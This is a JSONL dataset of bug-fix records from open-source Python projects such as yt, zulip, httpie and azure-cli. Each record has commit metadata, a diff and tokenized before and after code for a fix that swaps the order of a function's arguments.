{"project": "pychron", "commit_sha": "08079533c28a2d57c0368884dd46c47a158ed2ec", "parent_sha": "fd900f0f004eb1317804a4ce3b38bb76a5d9822f", "file_path": "pychron/processing/analyses/view/main_view.py", "project_url": "https://github.com/USGSMenloPychron/pychron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -323,7 +323,7 @@ class MainView(HasTraits):\n                 v, e = nominal_value(noncorrected), std_dev(noncorrected)\n                 ref = 295.5\n                 self.summary_str = u'Ar40/Ar36={} {}{}({}%) IC={:0.5f}'.format(floatfmt(v),\n-                                                                               floatfmt(e), PLUSMINUS,\n+                                                                               PLUSMINUS, floatfmt(e),\n                                                                                format_percent_error(v, e),\n                                                                                nominal_value(noncorrected/ref))\n         except:\n", "before": "self . summary_str = u'Ar40/Ar36={} {}{}({}%) IC={:0.5f}' . format ( floatfmt ( v ) , floatfmt ( e ) , PLUSMINUS , format_percent_error ( v , e ) , nominal_value ( noncorrected / ref ) )", "after": "self . summary_str = u'Ar40/Ar36={} {}{}({}%) IC={:0.5f}' . format ( floatfmt ( v ) , PLUSMINUS , floatfmt ( e ) , format_percent_error ( v , e ) , nominal_value ( noncorrected / ref ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 79, 5, 112], [\"identifier:PLUSMINUS\", \"T\"], 3], [\"Insert\", [\"argument_list\", 2, 79, 5, 112], [\",:,\", \"T\"], 4], [\"Delete\", [\"identifier:PLUSMINUS\", 3, 93, 3, 102]], [\"Delete\", [\",:,\", 3, 102, 3, 103]]]"}
{"project": "blender-addons", "commit_sha": "22e7fcf6233d054a8a4b79bfe34d4a940b3f3e43", "parent_sha": "96355d45455f1b8ae29a8d3f2cc719084e8c4aef", "file_path": "animation_add_corrective_shape_key.py", "project_url": "https://github.com/bwrsandman/blender-addons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -224,7 +224,7 @@ class object_duplicate_flatten_modifiers(bpy.types.Operator):\n         scene = context.scene\n         obj_act = context.active_object\n \n-        new_object = func_object_duplicate_flatten_modifiers(obj_act, scene)\n+        new_object = func_object_duplicate_flatten_modifiers(scene, obj_act)\n \n         # setup the context\n         bpy.ops.object.select_all(action='DESELECT')\n", "before": "new_object = func_object_duplicate_flatten_modifiers ( obj_act , scene )", "after": "new_object = func_object_duplicate_flatten_modifiers ( scene , obj_act )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:obj_act\", 3, 62, 3, 69], [\"argument_list\", 3, 61, 3, 77], 3], [\"Move\", [\",:,\", 3, 69, 3, 70], [\"argument_list\", 3, 61, 3, 77], 4]]"}
{"project": "ArbitrageBot", "commit_sha": "a7ef6fd3f485f0ea48825a11c7062025ac42a855", "parent_sha": "2c6627d1c3040df3b6b1ab1f2b57a9db5793fe88", "file_path": "tradingbot.py", "project_url": "https://github.com/BatuhanUsluel/ArbitrageBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ def main(argv):\n \t\t\ttrade(0, poloAsk, bittrexBid, bittrexTargetBalance, poloniexBaseBalance)\n \t\t#Sell to polo, Buy from Bittrex\n \t\telif(bittrexAsk<poloBid):\n-\t\t\ttrade(1, bittrexAsk, poloBid, bittrexBaseBalance, poloniexTargetBalance)\n+\t\t\ttrade(1, bittrexAsk, poloBid, poloniexTargetBalance, bittrexBaseBalance)\n \n \t\ttime.sleep(period)\n \n", "before": "trade ( 1 , bittrexAsk , poloBid , bittrexBaseBalance , poloniexTargetBalance )", "after": "trade ( 1 , bittrexAsk , poloBid , poloniexTargetBalance , bittrexBaseBalance )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:bittrexBaseBalance\", 3, 34, 3, 52], [\"argument_list\", 3, 9, 3, 76], 9], [\"Move\", [\",:,\", 3, 52, 3, 53], [\"argument_list\", 3, 9, 3, 76], 10]]"}
{"project": "zulip", "commit_sha": "7c467a8f019801fa80581c469efc078029162f2d", "parent_sha": "7bec0a29c49be94eafb108f34dff77365e5227b5", "file_path": "zerver/forms.py", "project_url": "https://github.com/emillind/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ class ZulipPasswordResetForm(PasswordResetForm):\n         user = get_user_profile_by_email(to_email)\n         attempted_subdomain = get_subdomain(self.request)\n         context['attempted_realm'] = False\n-        if not check_subdomain(user.realm.subdomain, attempted_subdomain):\n+        if not check_subdomain(attempted_subdomain, user.realm.subdomain):\n             context['attempted_realm'] = get_realm(attempted_subdomain)\n \n         send_email('zerver/emails/password_reset', to_user_id=user.id,\n", "before": "if not check_subdomain ( user . realm . subdomain , attempted_subdomain ) : context [ 'attempted_realm' ] = get_realm ( attempted_subdomain )", "after": "if not check_subdomain ( attempted_subdomain , user . realm . subdomain ) : context [ 'attempted_realm' ] = get_realm ( attempted_subdomain )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 74], [\"identifier:attempted_subdomain\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 31, 3, 74], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"identifier:attempted_subdomain\", 3, 54, 3, 73]]]"}
{"project": "dash", "commit_sha": "84c52140b8e9f2dd7ce088ff6e78d91e9c605fe9", "parent_sha": "c05890968898cb7f7aec7800743023fc228be631", "file_path": "tests/development/test_component_loader.py", "project_url": "https://github.com/undeadinu/dash", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class TestGenerateClasses(unittest.TestCase):\n             'default_namespace'\n         )\n \n-        generate_classes(METADATA_PATH, 'default_namespace')\n+        generate_classes('default_namespace', METADATA_PATH)\n         from default_namespace.MyComponent import MyComponent \\\n             as MyComponent_buildtime\n         from default_namespace.A import A as A_buildtime\n", "before": "generate_classes ( METADATA_PATH , 'default_namespace' )", "after": "generate_classes ( 'default_namespace' , METADATA_PATH )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:METADATA_PATH\", 3, 26, 3, 39], [\"argument_list\", 3, 25, 3, 61], 3], [\"Move\", [\",:,\", 3, 39, 3, 40], [\"argument_list\", 3, 25, 3, 61], 4]]"}
{"project": "sqlalchemy", "commit_sha": "d55722031a6f3c04e41cd31f9e2926e66ecab78f", "parent_sha": "885cae799895ac6adc4179758a25f1224beb87c3", "file_path": "test/orm/test_mapper.py", "project_url": "https://github.com/suever/sqlalchemy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -397,7 +397,7 @@ class MapperTest(_fixtures.FixtureTest, AssertsCompiledSQL):\n             (relationship, (Address,)),\n             (composite, (MyComposite, 'id', 'name'))\n         ]:\n-            obj = constructor(*args, info={\"x\": \"y\"})\n+            obj = constructor(info={\"x\": \"y\"}, *args)\n             eq_(obj.info, {\"x\": \"y\"})\n             obj.info[\"q\"] = \"p\"\n             eq_(obj.info, {\"x\": \"y\", \"q\": \"p\"})\n", "before": "obj = constructor ( * args , info = { \"x\" : \"y\" } )", "after": "obj = constructor ( info = { \"x\" : \"y\" } , * args )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 38, 3, 53], [\"argument_list\", 3, 30, 3, 54], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 54], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 36, 3, 37]]]"}
{"project": "intake", "commit_sha": "b475b2e444a0504824f45df5d887de96b6187b90", "parent_sha": "861ff56f414fa589c8caa9b1f17ad3a9a5d98daf", "file_path": "intake/catalog/local.py", "project_url": "https://github.com/teoliphant/intake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -263,7 +263,7 @@ class LocalCatalogEntrySchema(marshmallow.Schema):\n \n     @marshmallow.post_load\n     def instantiate(self, data):\n-        return LocalCatalogEntry(**data, catalog_dir=self.context['root'])\n+        return LocalCatalogEntry(catalog_dir=self.context['root'], **data)\n \n \n class PluginSourceSchema(marshmallow.Schema):\n", "before": "return LocalCatalogEntry ( ** data , catalog_dir = self . context [ 'root' ] )", "after": "return LocalCatalogEntry ( catalog_dir = self . context [ 'root' ] , ** data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 42, 3, 74], [\"argument_list\", 3, 33, 3, 75], 1], [\"Insert\", [\"argument_list\", 3, 33, 3, 75], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 40, 3, 41]]]"}
{"project": "C-PAC", "commit_sha": "3c53f583e50ba86b6ceafc56124a3caf3e0ce975", "parent_sha": "ce68e50abcc0680ac67f0966ad81704b8cc3d30c", "file_path": "CPAC/cwas/utils.py", "project_url": "https://github.com/nrajamani3/C-PAC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,6 +74,6 @@ def calc_mdmrs(D, regressor, cols, iter, strata=None):\n     p_set = np.zeros(nVoxels)\n     \n     for i in range(nVoxels):\n-        p_set[i], F_set[i], _, _ = mdmr(D[i].reshape(nSubjects**2,1), regressor, cols, iter, strata)\n+        p_set[i], F_set[i], _, _ = mdmr(D[i].reshape(1,nSubjects**2), regressor, cols, iter, strata)\n     \n     return F_set, p_set\n", "before": "p_set [ i ] , F_set [ i ] , _ , _ = mdmr ( D [ i ] . reshape ( nSubjects ** 2 , 1 ) , regressor , cols , iter , strata )", "after": "p_set [ i ] , F_set [ i ] , _ , _ = mdmr ( D [ i ] . reshape ( 1 , nSubjects ** 2 ) , regressor , cols , iter , strata )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 53, 3, 69], [\"integer:1\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 53, 3, 69], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 66, 3, 67]], [\"Delete\", [\"integer:1\", 3, 67, 3, 68]]]"}
{"project": "pyfacebook", "commit_sha": "29c9c507b09f9fceaf1716ca84155a6bab0cc9fe", "parent_sha": "f2d7ac907cd50edeb37e06e588404c4a72205888", "file_path": "examples/pyfacebook_sample/views.py", "project_url": "https://github.com/sciyoshi/pyfacebook", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def post(request):\n \n @facebook.require_login()\n def post_add(request):\n-    request.facebook.profile.setFBML('Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.', request.facebook.uid)\n+    request.facebook.profile.setFBML(request.facebook.uid, 'Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.')\n \n     return request.facebook.redirect('http://apps.facebook.com/pyfacebook/')\n \n", "before": "request . facebook . profile . setFBML ( 'Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.' , request . facebook . uid )", "after": "request . facebook . profile . setFBML ( request . facebook . uid , 'Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 174], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 37, 3, 174], [\"string:'Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.'\", \"T\"], 4], [\"Delete\", [\"string:'Congratulations on adding PyFaceBook. Please click on the PyFaceBook link on the left side to change this text.'\", 3, 38, 3, 151]], [\"Delete\", [\",:,\", 3, 151, 3, 152]]]"}
{"project": "yt", "commit_sha": "b62754bcc7dffc52664745df6e19c819788d48b8", "parent_sha": "9925193abeac1c8dc21cfc985f31260bf389120d", "file_path": "yt/analysis_modules/sunyaev_zeldovich/projection.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class SZProjection(object):\n             return vpar/clight\n         add_field(\"BetaPar\", function=_beta_par)    \n \n-        proj = self.pf.h.proj(axis, \"Density\", data_source=source)\n+        proj = self.pf.h.proj(\"Density\", axis, data_source=source)\n         proj.set_field_parameter(\"axis\", axis)\n         frb = proj.to_frb(width, nx)\n         dens = frb[\"Density\"]\n", "before": "proj = self . pf . h . proj ( axis , \"Density\" , data_source = source )", "after": "proj = self . pf . h . proj ( \"Density\" , axis , data_source = source )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 67], [\"string:\\\"Density\\\"\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 67], [\"identifier:axis\", \"T\"], 4], [\"Delete\", [\"identifier:axis\", 3, 31, 3, 35]], [\"Delete\", [\"string:\\\"Density\\\"\", 3, 37, 3, 46]]]"}
{"project": "yt", "commit_sha": "2062790cba6d38c4b75b328eefc906d427583ace", "parent_sha": "c038130c0fb6d5f08e4b1da339aefae838bffa99", "file_path": "yt/analysis_modules/sunyaev_zeldovich/projection.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -126,9 +126,9 @@ class SZProjection(object):\n             axis = data.get_field_parameter(\"axis\")\n             vpar = data[\"Density\"]*data[\"%s-velocity\" % (vlist[axis])]\n             return vpar/clight\n-        add_field(\"BetaPar\", function=_beta_par)    \n+        add_field(\"BetaPar\", function=_beta_par)\n \n-        proj = self.pf.h.proj(axis, \"Density\", data_source=source)\n+        proj = self.pf.h.proj(\"Density\", axis, data_source=source)\n         proj.set_field_parameter(\"axis\", axis)\n         frb = proj.to_frb(width, nx)\n", "before": "proj = self . pf . h . proj ( axis , \"Density\" , data_source = source )", "after": "proj = self . pf . h . proj ( \"Density\" , axis , data_source = source )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 5, 30, 5, 67], [\"string:\\\"Density\\\"\", \"T\"], 1], [\"Insert\", [\"argument_list\", 5, 30, 5, 67], [\"identifier:axis\", \"T\"], 4], [\"Delete\", [\"identifier:axis\", 5, 31, 5, 35]], [\"Delete\", [\"string:\\\"Density\\\"\", 5, 37, 5, 46]]]"}
{"project": "yt", "commit_sha": "0e5a7e6d5a7d80e3d9ce1fd70d0052cff2e39a7a", "parent_sha": "cfdbeccb26618dcd8df06fd3563a8f27ccdb94e3", "file_path": "yt/frontends/athena/data_structures.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -387,7 +387,7 @@ class AthenaDataset(Dataset):\n         self.magnetic_unit.convert_to_units(\"gauss\")\n \n     def set_code_units(self):\n-        super(self, AthenaDataset).set_code_units()\n+        super(AthenaDataset, self).set_code_units()\n         self.unit_registry.modify(\"code_magnetic\", self.magnetic_unit)\n \n     def _parse_parameter_file(self):\n", "before": "super ( self , AthenaDataset ) . set_code_units ( )", "after": "super ( AthenaDataset , self ) . set_code_units ( )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:self\", 3, 15, 3, 19], [\"argument_list\", 3, 14, 3, 35], 3], [\"Move\", [\",:,\", 3, 19, 3, 20], [\"argument_list\", 3, 14, 3, 35], 4]]"}
{"project": "yt", "commit_sha": "a122ffeef6ce614b42d15c5622bad8114ebc2cdd", "parent_sha": "6bcd62333809c9105a1ac4bfb2e91083094c02ab", "file_path": "yt/geometry/coordinates/spec_cube_coordinates.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class SpectralCubeCoordinateHandler(CartesianCoordinateHandler):\n \n     def setup_fields(self, registry):\n         if self.ds.no_cgs_equiv_length == False:\n-            return super(self, SpectralCubeCoordinateHandler\n+            return super(SpectralCubeCoordinateHandler, self\n                     ).setup_fields(registry)\n         for axi, ax in enumerate(self.axis_name):\n             f1, f2 = _get_coord_fields(axi)\n", "before": "return super ( self , SpectralCubeCoordinateHandler ) . setup_fields ( registry )", "after": "return super ( SpectralCubeCoordinateHandler , self ) . setup_fields ( registry )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:self\", 3, 26, 3, 30], [\"argument_list\", 3, 25, 4, 22], 3], [\"Move\", [\",:,\", 3, 30, 3, 31], [\"argument_list\", 3, 25, 4, 22], 4]]"}
{"project": "yt", "commit_sha": "efdc7647e2a27b6a2bdf41c6c2ba12488e6ed48f", "parent_sha": "703d65141f27956c53ad42d74cd79b466028ac51", "file_path": "yt/utilities/orientation.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class Orientation(object):\n         normal_vector /= np.sqrt(np.dot(normal_vector, normal_vector))\n         if north_vector is None:\n             vecs = np.identity(3)\n-            t = np.cross(normal_vector, vecs).sum(axis=1)\n+            t = np.cross(vecs, normal_vector).sum(axis=1)\n             ax = t.argmax()\n             east_vector = np.cross(vecs[ax, :], normal_vector).ravel()\n             # self.north_vector must remain None otherwise rotations about a fixed axis will break. \n", "before": "t = np . cross ( normal_vector , vecs ) . sum ( axis = 1 )", "after": "t = np . cross ( vecs , normal_vector ) . sum ( axis = 1 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:normal_vector\", 3, 26, 3, 39], [\"argument_list\", 3, 25, 3, 46], 3], [\"Move\", [\",:,\", 3, 39, 3, 40], [\"argument_list\", 3, 25, 3, 46], 4]]"}
{"project": "yt", "commit_sha": "a7777c3d43795942d24c341820f611b4f74b621d", "parent_sha": "274266771729686c0a5e42a8aa4fde2c28f85b45", "file_path": "yt_fire/fields.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class FIREFieldInfo(GadgetFieldInfo):\n             units=self.ds.unit_system[\"density\"])\n         add_species_field_by_density(self, ptype, \"H\", particle_type=True)\n         for suffix in [\"density\", \"fraction\", \"mass\", \"number_density\"]:\n-            self.alias((ptype, \"H_%s\" % suffix), (ptype, \"H_p0_%s\" % suffix))\n+            self.alias((ptype, \"H_p0_%s\" % suffix), (ptype, \"H_%s\" % suffix))\n \n         def _h_p1_density(field, data):\n             x_H = 1.0 - data[(ptype, \"He_metallicity\")] - \\\n", "before": "self . alias ( ( ptype , \"H_%s\" % suffix ) , ( ptype , \"H_p0_%s\" % suffix ) )", "after": "self . alias ( ( ptype , \"H_p0_%s\" % suffix ) , ( ptype , \"H_%s\" % suffix ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"tuple\", 3, 24, 3, 48], [\"argument_list\", 3, 23, 3, 78], 2], [\"Move\", [\"tuple\", 3, 50, 3, 77], [\"argument_list\", 3, 23, 3, 78], 1]]"}
{"project": "httpie", "commit_sha": "56d33a8e5120444f9f372e036601810bf8eaf6d7", "parent_sha": "15e62ad26d3eed587b2e2889421170eab5ab01ef", "file_path": "httpie/models.py", "project_url": "https://github.com/cybernetics/httpie", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class Environment(object):\n             actual_stdout = self.stdout\n             if is_windows:\n                 from colorama import AnsiToWin32\n-                if isinstance(AnsiToWin32, self.stdout):\n+                if isinstance(self.stdout, AnsiToWin32):\n                     actual_stdout = self.stdout.wrapped\n             self.stdout_encoding = getattr(\n                 actual_stdout, 'encoding', None) or 'utf8'\n", "before": "if isinstance ( AnsiToWin32 , self . stdout ) : actual_stdout = self . stdout . wrapped", "after": "if isinstance ( self . stdout , AnsiToWin32 ) : actual_stdout = self . stdout . wrapped", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 56], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 30, 3, 56], [\"identifier:AnsiToWin32\", \"T\"], 4], [\"Delete\", [\"identifier:AnsiToWin32\", 3, 31, 3, 42]], [\"Delete\", [\",:,\", 3, 42, 3, 43]]]"}
{"project": "azure-cli", "commit_sha": "48dffa539563d29bf468226a124e91aefeae78d3", "parent_sha": "29968ad42a05ebe5030c4fe2cc5292f5acd131fe", "file_path": "src/command_modules/azure-cli-resource/azure/cli/command_modules/resource/custom.py", "project_url": "https://github.com/saurabsa/azure-cli", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -802,7 +802,7 @@ def list_features(client, resource_provider_namespace=None):\n \n def register_feature(client, resource_provider_namespace, feature_name):\n     logger.warning(\"Once the feature '{}' is registered, invoking 'az provider register -n {}' is required \"\n-                   \"to get the change propagated\".format(resource_provider_namespace, feature_name))\n+                   \"to get the change propagated\".format(feature_name, resource_provider_namespace))\n     return client.register(resource_provider_namespace, feature_name)\n \n \n", "before": "logger . warning ( \"Once the feature '{}' is registered, invoking 'az provider register -n {}' is required \" \"to get the change propagated\" . format ( resource_provider_namespace , feature_name ) )", "after": "logger . warning ( \"Once the feature '{}' is registered, invoking 'az provider register -n {}' is required \" \"to get the change propagated\" . format ( feature_name , resource_provider_namespace ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:resource_provider_namespace\", 3, 58, 3, 85], [\"argument_list\", 3, 57, 3, 100], 3], [\"Move\", [\",:,\", 3, 85, 3, 86], [\"argument_list\", 3, 57, 3, 100], 4]]"}
{"project": "azure-cli", "commit_sha": "8e6e1e816011294f53ef00b7216ec9ea279e936e", "parent_sha": "ef66f403335cec8b25a0374dd1e4c60dd8799e98", "file_path": "src/command_modules/azure-cli-container/azure/cli/command_modules/container/custom.py", "project_url": "https://github.com/saurabsa/azure-cli", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -173,5 +173,5 @@ def container_logs(client, resource_group_name, name, container_name=None):\n     \"\"\"Tail a container instance log. \"\"\"\n     if container_name is None:\n         container_name = name\n-    log = client.container_logs.list(resource_group_name, container_name, name)\n+    log = client.container_logs.list(resource_group_name, name, container_name)\n     return log.content\n", "before": "log = client . container_logs . list ( resource_group_name , container_name , name )", "after": "log = client . container_logs . list ( resource_group_name , name , container_name )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:container_name\", 3, 59, 3, 73], [\"argument_list\", 3, 37, 3, 80], 5], [\"Move\", [\",:,\", 3, 73, 3, 74], [\"argument_list\", 3, 37, 3, 80], 6]]"}
{"project": "tf_app", "commit_sha": "9ebb0eb674a59fe908e72404820fb4c7a57d2f82", "parent_sha": "88635c226d63e01f44c9f4653477a515065f40ba", "file_path": "plugins/tff_backend/bizz/user.py", "project_url": "https://github.com/threefoldfoundation/tf_app", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ def _store_name(username, jwt, user_detail):\n         logging.debug('The name was already stored in user_data')\n     else:\n         user_data = dict(name='%s %s' % (iyo_user.firstname, iyo_user.lastname))\n-        system.put_user_data(api_key, user_detail.email, user_data, user_detail.app_id)\n+        system.put_user_data(api_key, user_detail.email, user_detail.app_id, user_data)\n \n \n @returns()\n", "before": "system . put_user_data ( api_key , user_detail . email , user_data , user_detail . app_id )", "after": "system . put_user_data ( api_key , user_detail . email , user_detail . app_id , user_data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 88], [\",:,\", \"T\"], 7], [\"Insert\", [\"argument_list\", 3, 29, 3, 88], [\"identifier:user_data\", \"T\"], 8], [\"Delete\", [\"identifier:user_data\", 3, 58, 3, 67]], [\"Delete\", [\",:,\", 3, 67, 3, 68]]]"}
{"project": "tf_app", "commit_sha": "76b5f1e9b2cba1943d263521a7e3e4b6533cf896", "parent_sha": "c785f101cf1618a3ea5f8a4cd378351e2cf0e98d", "file_path": "plugins/tff_backend/bizz/hoster.py", "project_url": "https://github.com/threefoldfoundation/tf_app", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -182,7 +182,7 @@ def _create_node_order_pdf(node_order_id):\n     logging.debug('Creating Hosting agreement')\n     pdf_name = NodeOrder.filename(node_order_id)\n     pdf_contents = create_hosting_agreement_pdf(node_order.billing_info.name, node_order.billing_info.address)\n-    pdf_url = upload_to_gcs(pdf_name, 'application/pdf', pdf_contents)\n+    pdf_url = upload_to_gcs(pdf_name, pdf_contents, 'application/pdf')\n     deferred.defer(_order_node_iyo_see, node_order.app_user, node_order_id, pdf_url)\n     deferred.defer(update_hoster_progress, user_email.email(), app_id, HosterSteps.FLOW_ADDRESS)\n \n", "before": "pdf_url = upload_to_gcs ( pdf_name , 'application/pdf' , pdf_contents )", "after": "pdf_url = upload_to_gcs ( pdf_name , pdf_contents , 'application/pdf' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'application/pdf'\", 3, 39, 3, 56], [\"argument_list\", 3, 28, 3, 71], 5], [\"Move\", [\",:,\", 3, 56, 3, 57], [\"argument_list\", 3, 28, 3, 71], 6]]"}
{"project": "gestorpsi-das", "commit_sha": "109d2c8e54c7fd9e00e5d82bee74d6bbb88ea97e", "parent_sha": "64bd3d96f2625ede94b6e9d6fc780646fdad354c", "file_path": "gestorpsi/users/views.py", "project_url": "https://github.com/gestorpsi-das-20161/gestorpsi-das", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -114,7 +114,7 @@ def create_user(request):\n         return HttpResponseRedirect('/user/add/?clss=error')\n     \n     site_url = \"http://%s\" % get_current_site(request).domain if not request.is_secure else \"http://%s\" % get_current_site(request).domain\n-    user = RegistrationProfile.objects.create_inactive_user(username, password, email, site_url)\n+    user = RegistrationProfile.objects.create_inactive_user(username, email, password, site_url)\n \n     user.set_password(password) # this is required! without it, password will not set ok\n     user.save(force_update=True)\n", "before": "user = RegistrationProfile . objects . create_inactive_user ( username , password , email , site_url )", "after": "user = RegistrationProfile . objects . create_inactive_user ( username , email , password , site_url )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:password\", 3, 71, 3, 79], [\"argument_list\", 3, 60, 3, 97], 5], [\"Move\", [\",:,\", 3, 79, 3, 80], [\"argument_list\", 3, 60, 3, 97], 6]]"}
{"project": "juanoffcodes", "commit_sha": "f55a166fa92c8e94b4e1feb2e8e91303db17fcc5", "parent_sha": "f284c015e8ae5544ef495f9dd696c18006def368", "file_path": "wynbot/wynbot.py", "project_url": "https://github.com/ammgws/juanoffcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ def main(arguments):\n     text_model = build_text_model(args.state_size, args.use_nltk, corpus_file, chain_file)\n     logging.debug('Starting message generation. Max. chars: %s', args.num_chars)\n     message = text_model.make_short_sentence(args.num_chars) or \"failed to generate message\"\n-    logging.info('Generated message (%s chars): \"%s\"', message, len(message))\n+    logging.info('Generated message (%s chars): \"%s\"', len(message), message)\n \n     # Setup Hangouts bot instance\n     hangouts = HangoutsClient(config_path, message)\n", "before": "logging . info ( 'Generated message (%s chars): \"%s\"' , message , len ( message ) )", "after": "logging . info ( 'Generated message (%s chars): \"%s\"' , len ( message ) , message )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 17, 3, 78], [\",:,\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 17, 3, 78], [\"identifier:message\", \"T\"], 6], [\"Delete\", [\"identifier:message\", 3, 56, 3, 63]], [\"Delete\", [\",:,\", 3, 63, 3, 64]]]"}
{"project": "python-aula10-bot-telegram", "commit_sha": "efea0361c57c563f8d3c580f0a5f530204009d52", "parent_sha": "91ae35e26c8f611a4a195f4ad0d912e87db544a7", "file_path": "telegram/files/document.py", "project_url": "https://github.com/exemplos/python-aula10-bot-telegram", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class Document(TelegramObject):\n \n         data['thumb'] = PhotoSize.de_json(data.get('thumb'), bot)\n \n-        return cls(**data, bot=bot)\n+        return cls(bot=bot, **data)\n \n     def get_file(self, timeout=None, **kwargs):\n", "before": "return cls ( ** data , bot = bot )", "after": "return cls ( bot = bot , ** data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 28, 3, 35], [\"argument_list\", 3, 19, 3, 36], 1], [\"Insert\", [\"argument_list\", 3, 19, 3, 36], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 26, 3, 27]]]"}
